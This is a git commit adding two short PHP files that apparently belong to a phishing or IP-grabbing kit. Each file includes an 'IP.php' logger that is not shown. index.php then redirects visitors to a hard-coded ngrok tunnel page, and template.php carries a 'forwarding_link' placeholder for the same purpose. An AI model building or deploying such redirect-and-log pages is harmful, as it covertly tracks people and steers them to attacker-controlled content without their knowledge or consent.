7f5a7ff77f43af09b35f6b1be31c64779dd6900b
Koushik <60229668+Neo-spywolf@users.noreply.github.com>
2022-03-06 07:12:45 +0000

    Add files via upload

---
+++ index.php
@@ -0,0 +1,6 @@
+<?php
+include 'IP.php';
+header('Location: https://c01d-2405-201-e031-908d-e927-2ec1-ad59-ed9c.ngrok.io/index2.html');
+exit
+?>
+
---
+++ template.php
@@ -0,0 +1,6 @@
+<?php
+include 'IP.php';
+header('Location: forwarding_link/index2.html');
+exit
+?>
+
